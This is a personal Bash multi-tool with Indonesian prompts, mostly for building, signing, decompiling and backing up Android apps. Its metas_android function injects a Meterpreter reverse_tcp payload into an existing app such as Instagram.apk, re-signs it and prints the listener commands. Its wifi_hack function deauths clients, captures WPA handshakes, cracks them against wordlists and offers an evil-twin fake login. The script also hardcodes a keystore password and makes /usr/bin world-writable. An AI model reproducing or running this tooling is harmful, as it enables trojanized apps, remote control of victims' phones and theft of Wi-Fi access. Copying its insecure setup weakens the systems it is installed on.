#!/bin/bash

#Colors vars
green_color="\033[1;32m"
green_color_title="\033[0;32m"
red_color="\033[1;31m"
red_color_slim="\033[0;031m"
blue_color="\033[1;34m"
cyan_color="\033[1;36m"
brown_color="\033[0;33m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
white_color="\e[1;97m"
normal_color="\e[1;0m"

#Data path
com="$@" #var sensitif
allib="/usr/lib/allib"
path_apk_empeded="$HOME/oprek/smali"
path_apk_backup="$HOME/Dokumen/android"
lib_apk_backup="$allib/build-tools"
default_apk_build="$allib/build-tools/main"
ndk="/home/shun/Android/android-ndk-r10e"

#Distros vars
known_compatible_distros=(
							"Wifislax"
							"Kali"
							"Parrot"
							"Backbox"
							"BlackArch"
							"Cyborg"
							"Ubuntu"
							"Debian"
							"SuSE"
							"CentOS"
							"Gentoo"
							"Fedora"
							"Red Hat"
							"Arch"
							"OpenMandriva"
						)

#Tools vars
essential_tools_names=(
						"ifconfig"
						"iwconfig"
						"iw"
						"awk"
						"airmon-ng"
						"airodump-ng"
						"aircrack-ng"
						"xterm"
						"apktool"
						"adb"
						"fastboot"
						"java"
						"javac"
						"unzip"
						"apache2"
						"mysql"
					)
declare -A possible_package_names=(
									[${essential_tools_names[0]}]="net-tools" #ifconfig
									[${essential_tools_names[1]}]="wireless-tools / wireless_tools" #iwconfig
									[${essential_tools_names[2]}]="iw" #iw
									[${essential_tools_names[3]}]="awk / gawk" #awk
									[${essential_tools_names[4]}]="aircrack-ng" #airmon-ng
									[${essential_tools_names[5]}]="aircrack-ng" #airodump-ng
									[${essential_tools_names[6]}]="aircrack-ng" #aircrack-ng
									[${essential_tools_names[7]}]="xterm" #xterm
									[${essential_tools_names[8]}]="apktool"
									[${essential_tools_names[9]}]="adb"
									[${essential_tools_names[10]}]="fastboot"
									[${essential_tools_names[11]}]="openjdk-8-jdk-headless"
									[${essential_tools_names[12]}]="openjdk-8-jdk-headless"
									[${essential_tools_names[13]}]="unzip"
									[${essential_tools_names[14]}]="apache2"
									[${essential_tools_names[15]}]="mysql"
								)


function last_echo() {
        echo -e "${2}$*${normal_color}"
}
function echo_green() {
	last_echo "${1}" "${green_color}"
}
function echo_blue() {
	last_echo "${1}" "${blue_color}"
}
function echo_yellow() {
	last_echo "${1}" "${yellow_color}"
}
function echo_red() {
	last_echo "${1}" "${red_color}"
}
function echo_red_slim() {
	last_echo "${1}" "${red_color_slim}"
}
function echo_green_title() {
	last_echo "${1}" "${green_color_title}"
}
function echo_pink() {
	last_echo "${1}" "${pink_color}"
}
function echo_cyan() {
	last_echo "${1}" "${cyan_color}"
}
function echo_brown() {
	last_echo "${1}" "${brown_color}"
}
function echo_white() {
	last_echo "${1}" "${white_color}"
}
#Generate a small time loop printing some dots
function time_loop() {
	echo -ne " "
	for (( j=1; j<=4; j++ )); do
		echo -ne "."
		sleep 0.035
	done
}


function apk_classToDex() {
	read -p "[+] Nama class: " classNama
	bash $allib/build-tools/dx --dex --output=classes.dex $classNama
	baksmali classes.dex
}
function apk_sign() {
	read -p "[+]  Masukan nama apk: " snapk
	echo "[+]  signing ..."
	jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $snapk mykey
	ls
}
#mengubah class ke java
function apk_vclass() {
	vclass=$allib/vclasslib
	ls
	read -p "[+]  Nama class: " vcapk
	java -jar $vclass/lib1.jar "$vcapk" > $vcapk".java"
	cat $vcapk".java"
}

function apk_build()
{
	read -p "[+]  compile/baru? c/b: " bapk
	read -p "[+]  Pakai lib external? y/n: " libapk
	lagi="y"
	while [ "$lagi" = "y" ]; do
		if [ "$bapk" = "b" ]; then
			ls; read -p "[+] Nama project BUKAN STRING : " nbapk
			if [ "`find $nbapk/AndroidManifest.xml`" != "" ]; then
				cat "$nbapk/"AndroidManifest.xml
			fi
			
			read -p "[+]  Nama paket (com/oke)    : " pbapk
			mkdir $nbapk; cd $nbapk
			mkdir -p src/$pbapk; mkdir assets
			mkdir obj; mkdir bin; mkdir -p res/layout
			mkdir res/values; mkdir res/drawable

                        read -p "[+]  Build C ndk code? y/n: " bndk
			if [ "$bndk" = "y" ]; then
				mkdir lib
                                cp -r $default_apk_build/jni `pwd`
			fi
			cat $default_apk_build/AndroidManifest.xml > AndroidManifest.xml
			cat $default_apk_build/MainActivity.java > src/$pbapk/MainActivity.java
			cat $default_apk_build/strings.xml > res/values/strings.xml
			cat $default_apk_build/main.xml > res/layout/main.xml
			cat $default_apk_build/styles.xml > res/values/styles.xml
			echo "folder dibuat"
		else
			echo; ls; echo 
			read -p "[+]  Nama project JANGAN string : " nbapk
			if [ "`find $nbapk/AndroidManifest.xml`" != "" ]; then
				cat "$nbapk/"AndroidManifest.xml
				echo ""
				apkbu_paket=`cat "$nbapk/"AndroidManifest.xml | grep package`
				echo_green $apkbu_paket
			fi
			echo ""
			read -p "[+]  Nama Paket (com/myapp)    : " pbapk
			export PROJ=`pwd`/$nbapk
			export LIBPROJ=$allib/build-tools
			sudo chmod 777 -R $PROJ
			cd $LIBPROJ
			if [ "$nbapk" == "" ]; then
					echo -e "\e[1;31m[!] Nama project dan paket kosong"
					exit
			fi
			
			if [ ! -d "$PROJ/obj" ]; then mkdir $PROJ/obj; fi
			if [ ! -d "$PROJ/bin" ]; then mkdir $PROJ/bin; fi
			echo  "[+]  Buat file R.java --->>"
			./aapt package -f -m -J $PROJ/src -M $PROJ/AndroidManifest.xml -S $PROJ/res -I $LIBPROJ/android.jar
			cd $PROJ

			clagi="y"
			while [ $clagi = "y" ]; do
				read -p "[+]  compile y/c/n : " EPROJ
				if [ "$EPROJ" = "y" ]; then
					
					if [ "$libapk" = "y" ]; then
						ls $PROJ/libs
						read -p "[+]  Nama file.jar: " namalib
						
						echo_yellow "###################### `date` #######################"
						echo_green_title "Compiling..."

						javac -d obj -classpath "src:libs/*.jar" -bootclasspath $LIBPROJ/android.jar src/$pbapk/*.java
					else
						echo_yellow "###################### `date` #######################"
						echo_green_title "Compiling..."

						javac -d obj -classpath src -bootclasspath $LIBPROJ/android.jar src/$pbapk/*.java
					fi

					echo_red "Finish compiling!"
					echo
				elif [ "$EPROJ" = "c" ]; then
					ls src/$pbapk
					echo
					read -p "[+]  Singgle java (MainActivity.java): " javacus
					echo_yellow "###################### `date` #######################"
					echo_green_title "Compiling "$javacus" ..."

					javac -d obj -classpath src -bootclasspath $LIBPROJ/android.jar src/$pbapk/$javacus

				else
					clagi="n"
				fi
			done

            cclagi="y"
            while [ $cclagi = "y" ]; do
                if [ -d jni ]; then
                    read -p "[+]  jni compile y/n: " jnicompile
                else
                    cclagi="n"
                fi
                if [ "$jnicompile" = "y" ]; then
                    $ndk/ndk-build
                    mv libs/* lib
                    rm -r libs
                else
                    cclagi="n"
                fi
            done

			cd $LIBPROJ
			echo
			echo_blue "[+]  Dexing -->> ";./dx --dex --output=$PROJ/bin/classes.dex $PROJ/obj >/dev/null
			echo_yellow "[+]  Build apk -->> ";./aapt package -f -m -F $PROJ/bin/out.apk -A $PROJ/assets -M $PROJ/AndroidManifest.xml -S $PROJ/res -I $LIBPROJ/android.jar >/dev/null
			cp $PROJ/bin/classes.dex .
			./aapt add $PROJ/bin/out.apk classes.dex  >/dev/null
			./aapt list $PROJ/bin/out.apk  >/dev/null

			if [ -d $PROJ/jni ]; then
				echo "[+]  Sample add lib: aapt add bin/out.apk lib/armeabi/lib.so lalu sign ulang"
			fi
			echo_green  "[+]  Signing apk -->>"; jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $PROJ/bin/out.apk mykey  >/dev/null
			
			echo ""
			echo_yellow "###### SUKSES ######"
			echo "path   : $PROJ/bin/out.apk"; echo
			read -p "[+]  Install? y/n : " ins
			if [ "$ins" = "y" ]; then
				spbapk=($(echo "$pbapk" | tr '/' '\n'))
				for i in "${!spbapk[@]}"; do
					echo -ne "${spbapk[i]}."
				done
				echo ""
				read -p "[+]  masukan paket (com.sample) : " tpbapk
				#adb uninstall "$tpbapk"; sleep 3; echo "[+] uninstall sukses"
				adb install "$PROJ/bin/out.apk"
				echo "[+] open: adb shell am start -n com.cpu/com.cpu.MainAsisten"
			fi
		fi
		cd "$aktif"
		read -p "[+] Lagi? y/n : " lagi
	done	
}
#untuk backup apk via usb adb am make
function apk_backup()
{
	if [ ! -d $path_apk_backup"/apk" ]; then
		echo "[+] Membuat folder Apk...";
		mkdir -p $path_apk_backup"/apk"
	fi
	if [ ! -d $path_apk_backup"/cache" ]; then
		echo "[+] Membuat folder Cache...";
		mkdir -p $path_apk_backup"/cache"
	fi

	read -p "[+]  Cache atau Apk c/a? : " apkb
	if [ "$apkb" = "a" ]; then
		
		cd $allib/build-tools
		if [ -z "$1" ]; then
			echo "Anda harus lulus paket untuk fungsi ini"
			echo "Ex: apk_backup_apk \"com.android.contacts\""
			return 1
		fi
		if [ -z "$(./adb shell pm list packages | grep $1)" ]; then
			echo "invalid packet list!"
			return 1
		fi
		apk_path="`./adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
		apk_name="`basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"
		destination=$path_apk_backup"/apk"
		./adb pull ${apk_path} ${destination}
		echo -e "\nAPK simpan di $destination/$paket"
		cd "$destination"
		mv $apk_name $paket".apk"
		chmod 777 $paket".apk"
	else
		
		cd $lib_apk_backup
		if [ -z "$1" ]; then
			echo "Anda harus lulus paket untuk fungsi ini"
			echo "Ex: apk_backup_apk \"com.android.contacts\""
			return 1
		fi
		if [ -z "$(./adb shell pm list packages | grep $1)" ]; then
			echo "invalid packet list!"
			return 1
		fi
		apk_path="`./adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
		apk_name="`basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"
		destination=$path_apk_backup"/cache"

		read -p "[+]  backup atau kembalikan cache:  b/k : " rest
		if [ "$rest" = "b" ]; then
			./adb backup -f /tmp/$paket".ab" $paket
			mv "/tmp/$paket".ab $destination
			echo -e "\nCache APK tersimpan $destination"
		fi
		if [ "$rest" = "k" ]; then
			read -p "Yakin mau KEMBALIKAN? y/t: " alert
			if [ "$alert" = "y" ]; then
				ls -l $destination
				read -p "Masukan ab file: " abf
				./adb restore "$destination/$abf"
			fi
		fi
	fi
}
#bongkar apk hasil smali code dan class
function apk_empeded() {
	if [ ! -d $path_apk_empeded ]; then
		echo "[+]  Membuat folder Empeded..."
		mkdir -p $path_apk_empeded
	fi
	read -p "[+]  Decompile, Compile, Backdoor d/c/b? : " apkdc

	if [ "$apkdc" = "d" ]; then
		read -p "[+]  Semua atau jar s/j? : " dapk
		if [ $dapk = "s" ]; then
			echo "-->> Nama apk [tanpa tanda petik biarkan spasi]"
			ls
			read -p "[+]  Nama apk: " dnapk
			vclass=$allib/vclasslib

			control=`ls $path_apk_empeded | grep "$dnapk"`
			read -p "[+]  Apakah $dnapk y/n: " tesdnapk

			if [ "$control" = "$dnapk" ]; then
				read -p "[+]  file sudah ada ganti? y/t : " g
				if [ "$g" = "y" ]; then
					rm -R "$path_apk_empeded/$dnapk"
					apk_empeded
				fi
			elif [ "$tesdnapk" = "n" ]; then
				apk_empeded
			elif [ "$dnapk" = "" ]; then
				echo "Error: nama kosong"
				apk_empeded
			else
				mkdir "$path_apk_empeded/$dnapk"
				cp "$dnapk" "$path_apk_empeded/$dnapk"
				cd "$path_apk_empeded/$dnapk"
				apktool d "$dnapk"
				mkdir java
				mv "$dnapk" java
				cd java
				echo "[+]  dex to class"
				bash $allib/dex2jar/d2j-dex2jar.sh "$dnapk"
				find_jar=`ls | grep *.jar`
				a=`unzip "$find_jar"`
				at=($(echo "$a" | tr ':' '\n'))

				read -p "Apakah semua class mau diubah ke java? y/t: " jcontrol

				for i in "${!at[@]}"; do
					if [ "$jcontrol" = "y" ]; then
						if [ ${at[i]} = "inflating" ]; then
							jsplit=($(echo "${at[i+1]}" | tr '.' '\n'))
							echo "[+] $jsplit".java
							java -jar $vclass/lib1.jar "${at[i+1]}" > $jsplit".java"
						elif [ ${at[i]} = "creating" ]; then
							folder="${at[i+1]}"
							echo ""
							echo "[=] proses di folder: $folder"
						fi
					fi
				done
				echo "<<< tersimpan di  $path_apk_empeded/$dnapk >>"
			fi
		else 
			read -p "[+]  Nama jar/apk: " njdapk
			bash $allib/dex2jar/d2j-dex2jar.sh "$njdapk"
		fi

	elif [ "$apkdc" = "c" ]; then
		bash $allib/apktool/apktool b
		cd dist
		ncapk=`ls | grep "apk"`
		echo "[+] sign apk ...."
		jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $ncapk mykey  >/dev/null
		read -p "[+] Install y/n : " icapk
		if [ "$icapk" != "" ]; then
                	adb install  $ncapk
		fi
		ls
	elif [ "$apkdc" = "b" ]; then
		read -p "[+]  Offline/Online? off/on" bpil

		if [ "$bpil" = "off" ]; then
			echo 
		fi
	fi
}

function git_manager() {
	echo
	echo_green_title "        GIT MANAGER"
	echo
    read -p "upload/clone? u/c: " git_m
    echo_pink "$git_m"

    if [ "$git_m" = "u" ]; then
        git init
        git add .
        read -p "[+]  Masukan commit: " comit
        git commit -m "$comit"
        read -p "[+]  Masukan http: " http
        git remote add origin "$http"
        git push -f origin master

    elif [ "$git_m" = "c" ]; then
        read -p "[+]  Masukan link: " git_url
        pwd
        git clone "$git_url"
    else
        echo_red "[!]  input git salah"
    fi
}

function metas_android() {
	#read -p "[+]  ruby apk-embed-payload.rb Instagram.apk -p android/meterpreter/reverse_tcp lhost=ipmu lport=1337"
	
	read -p "[+]  sisip nama apk ex-> myapp.apk: " metas_nama
	read -p "[+]  sisip ip local ex-> 10.42.0.1: " metas_ip
	ruby $allib/apk-embed/apk-embed-payload.rb "$metas_nama" -p "android/meterpreter/reverse_tcp lhost=$metas_ip lport=1337"

	read -p "[+]  signing? y/n: "
	jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $metas_nama mykey
	ls

	echo
	echo_red "next Usage: "
	echo "[ exploit ] msfconsole"
	echo "[ exploit ] use exploit/multi/handler"
	echo "[ exploit ] set payload android/meterpreter/reverse_tcp"
	echo "[ exploit ] set lhost ipmu"
	echo "[ exploit ] set lport 1337"
	echo "[ exploit ] exploit"
}

function cerah() {
	MAX=`cat /sys/class/backlight/intel_backlight/max_brightness`
	NOW=`cat /sys/class/backlight/intel_backlight/brightness`

	echo "-->> Maximal : [ $MAX ]"
	echo "-->> Sekarang : [ $NOW ]"
	echo 1500 > /sys/class/backlight/intel_backlight/brightness
	echo "-->> Default : [ 1500 ]"
	read -p "Masukan Kecerahan sekarang : " cer

	if [ "$cer" = "" ]; then
		echo "-->> Memakai default"
	else
		echo "$cer" > /sys/class/backlight/intel_backlight/brightness
		echo "[ $cer ]"
	fi
}

function install_data() {
	bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"

	# disto
	for i in "${known_compatible_distros[@]}"; do
		if uname -a | grep "${i}" -i > /dev/null; then
			distro="${i^}"
			break
		fi
	done

	echo_blue "Bash version: $bashversion"
	echo_blue "User        : `whoami`"
	echo_blue "Disto       : $distro"

	#cek tools
	essential_toolsok=1
	for i in "${essential_tools_names[@]}"; do
		echo -ne "${i}"
		time_loop
		if ! hash "${i}" 2> /dev/null; then
			echo -ne "${red_color} Error${normal_color}"
			essential_toolsok=0
			echo -ne " ${possible_package_names_text[${language}]}${possible_package_names[${i}]}"
			echo -e "\r"
		else
			echo -e "${green_color} Ok\r${normal_color}"
		fi
	done
	echo

	if [ ! -d $allib ]; then
		echo_red_slim "[!] Data allib kosong Enter untuk memindah"
		read -p "Enter"
		mv allib "/usr/lib/"
		chmod 777 -R "$allib"
		cp ai "/usr/bin"
		chmod 777 "/usr/bin"
	else
		read -p "Update data? y/n: " ins
		if [ "$ins" = "y" ]; then
			read -p "Enter"
			rm -R "$allib"
			mv allib "/usr/lib/"
			chmod 777 -R "$allib"
			cp ai "/usr/bin"
			chmod 777 "/usr/bin"
		fi
	fi
}

function wifi() {

	nmcli connection add type wifi ifname '*' con-name alice autoconnect no ssid "Server alice"
    nmcli connection modify alice 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
    nmcli connection up alice
}
function wifi_hack()
{
	iwconfig
	read -p "[+] interface Name ex wlan0: " wifin
	read -p "[+] monitor? ENTER adalah mon0  : " wifimon
	read -p "[+] evil/brute e/b? : " wif
	wifmon="mon0"
	wifsave="$HOME/wifi"
	wiftmp="/tmp/wifihacking"
	wifserver="$allib/fakelogin/tplink"
	if [ "$wifimon" != "" ]; then
		wifmon="$wifimon"
	fi
	if [ ! -d $wifsave ]; then
		mkdir -p $wifsave
	fi
	if [ ! -d $wiftmp ]; then
		mkdir -p $wiftmp
	fi

	airmon-ng start "$wifin"
	if [ "$wif" = "e" ]; then
		buatfakedns & buatserver
		fuser -n tcp -k 53 67 80 &
		fuser -n udp -k 53 67 80
		xterm -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout $wifsave/server.pem -out $wifsave/server.pem
		echo "############ sample ###############"
		echo "aireplay-ng -O O -a <ssid> -c <station> --ignore-negative-one mon0"
		read -p "[+] Nama Fake wifi : " wifen
		read -p "[+] Nama BSSID     : " wifeb
		echo "tunggu..."
	elif [ "$wif" = "b" ];then
		read -p "[+] online/offline? on/of : " wifb
		if [ "$wifb" = "on" ]; then
			xterm -title "cari informasi wifi" -e airodump-ng $wifmon -w $wiftmp/hand
			cat $wiftmp/hand-01.csv
			read -p "[+] MAC address: " wifbmac
			read -p "[+] Nomor channel: " wifbch
			xterm -bg "#000000" -fg "#00AA00" -title "handsake wifi brute online dump-save" -e airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wifbtmp/hand $wifmon &
			xterm -bg "#000000" -fg "#FF00A4" -title "kill wifi brute online mdk3" -e mdk3 $wifmon d &
			read -p "[+] ENTER JIKA DAPAT HANDSHAKENYA>>> "
			killall xterm
			echo "aircrack-ng -w $wifbw $wiftmp/*.cap &"
			read -p "[+] ~ Nama Wordlist *.txt : " wifbw
			xterm -e aircrack-ng -w ~/$wifbw -b $wifbmac $wiftmp/*.cap &

			read -p "[+] simpan handshakes? y/n : " wifbs
			if [ "$wifbs" = "y" ]; then
				read -p "[+] Nama handsake : " wifbsn
				cd $wifsave; mkdir "$wifbsn"
				mv $wiftmp/* "$wifbsn"
			else
				echo "[+] remove all handsake"
				rm $wiftmp/*
			fi
		elif [ "$wifb" = "of" ]; then
			read -p "[+] ~ Nama Wordlist *.txt : " wifbw
			ls $wifsave
			read -p "[+] Nama wifi : " wifbh
			echo "aircrack-ng -w $wifbw $wiftmp/*.cap &"
			cd; aircrack-ng -w $wifbw $wifsave/$wifbh/*.cap &
		else
			echo "wifi input error"
		fi
	fi
}


function apk_index() {
	echo
	echo_green_title "        APK INDEX"
	echo
	echo_green_title "Select an option from menu:"

	echo_blue "---------"
	echo_pink "1.  Build android apk"
	echo_pink "2.  Empeded android app decompile/compile"
	echo_pink "3.  Sign manually android app"
	echo_pink "4.  View class to java code"
	echo_pink "5.  Backup android app"
	echo_pink "6.  Adb touch"
	echo_pink "7.  Apk class to dex"
	echo_pink "8.  Android metasploit tutor"

	read -rp "> " apk_option
	case ${apk_option} in
		0)
			echo_red "[?] Exit script"
		;;
		1)
			if ! hash "java" 2> /dev/null; then
				echo
				echo -ne "${red_color}         Error java not installed ${normal_color}"
				echo
				exit
			else
				apk_build
			fi
		;;
		2)
			if ! hash "java" 2> /dev/null; then
				echo
				echo -ne "${red_color}         Error java not installed ${normal_color}"
				echo
				exit
			else
				apk_empeded
			fi
		;;
		3)
			if ! hash "java" 2> /dev/null; then
				echo
				echo -ne "${red_color}         Error java not installed ${normal_color}"
				echo
				exit
			else
				apk_sign
			fi
		;;
		4)
			if ! hash "java" 2> /dev/null; then
				echo
				echo -ne "${red_color}         Error java not installed ${normal_color}"
				echo
				exit
			else
				apk_vclass
			fi
		;;
		5)
			lagi="y"
			while [ $lagi = "y" ]; do
				read -p "[+]  Masukan nama paket ENTER semua: " apknb
				apknr=""
				cd "$allib/build-tools"
				if [ "$apknb" = "" ]; then
					apknr=`./adb shell pm list packages`
				else
					apknr=`./adb shell pm list packages | grep "$apknb"`
				fi
				nspaket=($(echo "$apknr" | tr ':' '\n'))
				for i in "${!nspaket[@]}"; do
					if [ ${nspaket[i]} = "package" ]; then
						jsplit=($(echo "${nspaket[i+1]}" | tr ':' '\n'))
						echo "$jsplit"
					fi
				done
				read -p "[+]  Masukan backup package: " paket
				apk_backup $paket
				read -p "[+]  Lagi ? y/n : " lagi
			done
		;;
		6)
			while [ true ]; do
				echo -n "."
				# home
				adb shell input keyevent 3
				sleep 1
				# phone key
				#adb shell input keyevent 5
				start launcher
				adb shell input tap 150 500
				sleep 1
			done
		;;
		7)
			if ! hash "java" 2> /dev/null; then
				echo
				echo -ne "${red_color}         Error java not installed ${normal_color}"
				echo
				exit
			else
				apk_classToDex
			fi
		;;
		8)
			metas_android
		;;
		*)
			echo
			echo_red "[!] Input not found try again"
			read -p "Enter"
		;;
	esac

	apk_index
}


if [ "$com" = "apkkey" ]; then
	apk_index
elif [ "$com" = "git" ]; then
	git_manager
elif [ "$com" = "cerah" ]; then
	cerah
elif [ "$com" = "edit" ]; then
	cd $allib/sublime
	./sublime_text 2>/dev/null &
elif [ "$com" = "wifi" ]; then
	wifi
elif [ "$com" = "wifi_hack" ]; then
	wifi_hack
elif [ "$com" = "install" ]; then
	install_data
else
	echo
	echo_green_title "    DAFTAR PERINTAH"
	echo
	echo_yellow "apkkey: manajer aplikasi android"
	echo_yellow "git: manajer git"
	echo_yellow "wifi: membuat wifi hotspot"
	echo_yellow "cerah: mengatur Kecerahan layar"
	echo_yellow "edit: membuka text editor"
	echo_yellow "wifi_hack: mengetes wifi"
	echo_yellow "install: jika ini program diinstall dikomputer baru jalankan perintah ini"
	echo
fi
